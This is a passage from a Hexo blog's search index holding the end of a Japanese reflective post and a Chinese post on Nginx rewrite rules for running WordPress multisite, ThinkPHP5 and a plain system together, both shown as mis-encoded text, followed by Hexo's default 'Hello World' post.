ã‚Œã‹ã«è¦‹ã¤ã‘ã¦ã‚‚ã‚‰ã„ãŸã„ã¨ä¿¡å·ã‚’é€ã£ã¦ã„ã‚‹ã®ã§ã™ã€‚</p><p>ãã‚“ãªé­é›£ä¿¡å·ã‚’é€ã£ã¦ãŠããªãŒã‚‰ã€åƒ•ã¯è¦‹ã¤ã‘ã‚‰ã‚Œã¦ã‚‚æŠ±ãç· ã‚ãªãã¦ã„ã„ã¨è¨€ã£ã¦ã„ã¾ã™ã€‚</p><p>ä¸€æ–¹ã§ã€åƒ•ã«æ°—ã¥ã„ãŸã‚‰ç¬‘ã„ã‹ã‘ã¦æ¬²ã—ã„ã¨é¡˜ã£ã¦ã„ã¾ã™ã€‚</p><p>ã“ã‚Œã¯ã€åƒ•ãŒæŠ±ãã—ã‚ã‚‹ã“ã¨ã®ã§ããªã„å­˜åœ¨ã ã¨ã„ã†ã“ã¨ã‚’è¨€ã£ã¦ã„ã‚‹ã®ã§ã¯ãªã„ã§ã—ã‚‡ã†ã‹ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> å°è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deploy WordPress, ThinkPHP5 and general system in Nginx</title>
      <link href="2019/06/24/maintence/"/>
      <url>2019/06/24/maintence/</url>
      
        <content type="html"><![CDATA[<h3 id="è®°ä¸€æ¬¡Nginxä¸ŠåŒæ—¶éƒ¨ç½²WordPressã€-ThinkPHP5-å’Œ-æ™®é€šç³»ç»Ÿï¼Œå…¶ä¸­WordPressä½¿ç”¨ç›®å½•å¤šç«™ç‚¹"><a href="#è®°ä¸€æ¬¡Nginxä¸ŠåŒæ—¶éƒ¨ç½²WordPressã€-ThinkPHP5-å’Œ-æ™®é€šç³»ç»Ÿï¼Œå…¶ä¸­WordPressä½¿ç”¨ç›®å½•å¤šç«™ç‚¹" class="headerlink" title="è®°ä¸€æ¬¡Nginxä¸ŠåŒæ—¶éƒ¨ç½²WordPressã€ ThinkPHP5 å’Œ æ™®é€šç³»ç»Ÿï¼Œå…¶ä¸­WordPressä½¿ç”¨ç›®å½•å¤šç«™ç‚¹"></a>è®°ä¸€æ¬¡Nginxä¸ŠåŒæ—¶éƒ¨ç½²WordPressã€ ThinkPHP5 å’Œ æ™®é€šç³»ç»Ÿï¼Œå…¶ä¸­WordPressä½¿ç”¨ç›®å½•å¤šç«™ç‚¹</h3><h5 id="è¿™æ¬¡ç³»ç»Ÿéƒ¨ç½²ä¸»è¦é‡åˆ°ä»¥ä¸‹å››ä¸ªé—®é¢˜ï¼Œä»¥è‡³äºèŠ±è´¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œä½†æ€»çš„æ¥è¯´è¿˜æ˜¯å› ä¸ºå¯¹nginxé…ç½®ç›¸å¯¹ä¸ç†Ÿç»ƒã€‚"><a href="#è¿™æ¬¡ç³»ç»Ÿéƒ¨ç½²ä¸»è¦é‡åˆ°ä»¥ä¸‹å››ä¸ªé—®é¢˜ï¼Œä»¥è‡³äºèŠ±è´¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œä½†æ€»çš„æ¥è¯´è¿˜æ˜¯å› ä¸ºå¯¹nginxé…ç½®ç›¸å¯¹ä¸ç†Ÿç»ƒã€‚" class="headerlink" title="è¿™æ¬¡ç³»ç»Ÿéƒ¨ç½²ä¸»è¦é‡åˆ°ä»¥ä¸‹å››ä¸ªé—®é¢˜ï¼Œä»¥è‡³äºèŠ±è´¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œä½†æ€»çš„æ¥è¯´è¿˜æ˜¯å› ä¸ºå¯¹nginxé…ç½®ç›¸å¯¹ä¸ç†Ÿç»ƒã€‚"></a>è¿™æ¬¡ç³»ç»Ÿéƒ¨ç½²ä¸»è¦é‡åˆ°ä»¥ä¸‹å››ä¸ªé—®é¢˜ï¼Œä»¥è‡³äºèŠ±è´¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œä½†æ€»çš„æ¥è¯´è¿˜æ˜¯å› ä¸ºå¯¹nginxé…ç½®ç›¸å¯¹ä¸ç†Ÿç»ƒã€‚</h5><ul><li>wordpressæœ¬èº«è·¯ç”±ç‰¹ç‚¹ï¼Œwordpressåœ¨å»ºç«™æ—¶ä¼šæŠŠç½‘ç«™çš„æ ¹åœ°å€å­˜åœ¨æ•°æ®åº“çš„wp_optionsè¡¨çš„siteurlã€homeã€ossdl_off_cdn_urlå’Œossdl_off_blog_urlå­—æ®µä¸­ï¼Œè·¯ç”±éƒ½æ˜¯ä»æ•°æ®åº“ä¸­è¯»å–ã€‚æ‰€ä»¥nginxæ— è®ºæ€ä¹ˆä¿®æ”¹é…ç½®éƒ½æ˜¯æµ‹è¯•ä¸äº†é—®é¢˜çš„ã€‚</li></ul><ul><li>wordpressåŸŸåå¤šç«™ç‚¹ä¸ç›®å½•å¤šç«™ç‚¹å­˜åœ¨ç€ä¸åŒä¹‹å¤„ï¼Œå®‰è£…wpç›®å½•å¤šç«™ç‚¹æ—¶ï¼Œå¿…é¡»è¦åœç”¨æ‰€æœ‰æ’ä»¶å†å¼€å¯ã€‚</li></ul><ul><li>wpç›®å½•å¤šç«™ç‚¹çš„é‡å†™è§„åˆ™ï¼Œç”±äºwpè·¯ç”±çš„ç‰¹æ®Šæ€§ï¼Œwpåœ¨nginxçš„é…ç½®ä¼šè¦†ç›–å…¶ä»–ç³»ç»Ÿçš„é…ç½®ï¼Œæ‰€ä»¥è®¿é—®uriæ—¶å¿…é¡»é¦–å…ˆé‡å†™å…¶ä»–ç³»ç»Ÿçš„uriã€‚åˆç”±äºå­˜åœ¨wpï¼Œtp5ï¼Œä»¥åŠåŸç”Ÿç³»ç»Ÿï¼Œä¸‰ç§ä¸åŒè·¯ç”±çš„è§„åˆ™ï¼Œä¸€å¼€å§‹æœåŠ¡å™¨é…ç½®åˆç»è¿‡è®¸å¤šäººæ‰‹ï¼Œé…ç½®èµ·æ¥æ¯”è¾ƒå‡Œä¹±ã€‚</li></ul><ul><li>ç”±äºåœ¨ç¼–è¯‘å®‰è£…nginxæ—¶ï¼Œæ²¡æœ‰è£…ä¸Šechoè¾“å‡ºï¼Œåœ¨æˆ‘ä»¬è°ƒè¯•æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™é‡å†™uriæ—¶å€™å¸¦æ¥äº†å¾ˆå¤šéº»çƒ¦ï¼Œéœ€è¦æ”¹ä¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åæŸ¥çœ‹logæ–‡ä»¶ï¼Œç«™ç‚¹è®¿é—®æƒ…å†µç­‰æ‘¸ç´¢å®ƒçš„é‡å†™è§„å¾‹ã€‚</li></ul><h4 id="ä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶å†…å®¹"><a href="#ä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶å†…å®¹" class="headerlink" title="ä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶å†…å®¹:"></a>ä»¥ä¸‹æ˜¯é…ç½®æ–‡ä»¶å†…å®¹:</h4><h5 id="RoomReserver-æ˜¯æ™®é€šç³»ç»Ÿï¼Œtpmasæ˜¯ThinkPHP5ç³»ç»Ÿ"><a href="#RoomReserver-æ˜¯æ™®é€šç³»ç»Ÿï¼Œtpmasæ˜¯ThinkPHP5ç³»ç»Ÿ" class="headerlink" title="RoomReserver æ˜¯æ™®é€šç³»ç»Ÿï¼Œtpmasæ˜¯ThinkPHP5ç³»ç»Ÿ"></a>RoomReserver æ˜¯æ™®é€šç³»ç»Ÿï¼Œtpmasæ˜¯ThinkPHP5ç³»ç»Ÿ</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#RoomResever rewrite rule</span><br><span class="line">rewrite ^&#x2F;RoomReserve&#x2F;(.*)$ &#x2F;RoomReserve&#x2F;$1 break;</span><br><span class="line"></span><br><span class="line">#tpmas rewrite rule</span><br><span class="line">if ( $request_uri ~* &#x2F;tpmas&#x2F; ) &#123;</span><br><span class="line">    rewrite  ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break;</span><br><span class="line">#rewrite  ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last;  break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#wordpress rewrite rule</span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?wp-admin$ &#x2F;$1wp-admin&#x2F; permanent;</span><br><span class="line"></span><br><span class="line">if (-f $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if (-d $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($rule_2 &#x3D; &quot;1&quot;)&#123;</span><br><span class="line">#ignored: â€œ-â€ thing used or unknown variable in regex&#x2F;rew</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(wp-(content|admin|includes).*) &#x2F;$2 last;</span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(.*.php)$ &#x2F;$2 last;</span><br><span class="line">rewrite &#x2F;. &#x2F;index.php last;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2019/06/23/hello-world/"/>
      <url>2019/06/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
